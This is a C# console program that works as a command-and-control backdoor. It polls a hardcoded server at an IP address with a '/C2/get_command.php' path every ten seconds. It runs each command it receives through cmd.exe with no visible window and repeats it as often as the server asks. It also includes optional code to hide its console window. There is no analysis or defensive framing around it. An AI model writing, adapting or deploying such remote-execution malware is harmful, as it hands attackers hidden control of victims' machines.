using System;
using System.Diagnostics;
using System.Net;
using Newtonsoft.Json;

namespace CommandReceiverConsoleApp
{
    class Program
    {
        static void Main(string[] args)
        {
            // Uncomment this if you want your application to be hidden

            //var handle = NativeMethods.GetConsoleWindow();
            //NativeMethods.ShowWindow(handle, NativeMethods.SW_HIDE);

            while (true)
            {
                var commandData = FetchCommandFromServer();
                if (commandData != null)
                {
                    Console.WriteLine("Received command data: " + commandData);

                    var responseData = JsonConvert.DeserializeObject<dynamic>(commandData);
                    string command = responseData.command;
                    int repetitionCount = responseData.repetition;

                    if (!string.IsNullOrEmpty(command) && repetitionCount > 0)
                    {
                        for (int i = 0; i < repetitionCount; i++)
                        {
                            string output = RunCommandInCmd(command);
                            Console.WriteLine(output);
                        }
                    }
                }

                System.Threading.Thread.Sleep(10000); // 10 seconds
            }
        }

        private static string FetchCommandFromServer()
        {
            try
            {
                using (var client = new WebClient())
                {
                    string commandData = client.DownloadString("http://45.134.173.182/C2/get_command.php");

                    int jsonStartIndex = commandData.IndexOf('{');

                    string jsonCommandData = commandData.Substring(jsonStartIndex);

                    return jsonCommandData;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error fetching command: " + ex.Message);
                return null;
            }
        }


        private static string RunCommandInCmd(string command)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "cmd.exe";
                psi.Arguments = "/C " + command;
                psi.RedirectStandardOutput = true;
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;

                Process process = new Process();
                process.StartInfo = psi;
                process.Start();

                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();

                return output;
            }
            catch (Exception ex)
            {
                return "Error executing command: " + ex.Message;
            }
        }
    }

    internal static class NativeMethods
    {
        internal const int SW_HIDE = 0;
        internal const int SW_SHOW = 5;

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        internal static extern IntPtr GetConsoleWindow();

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        internal static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    }
}
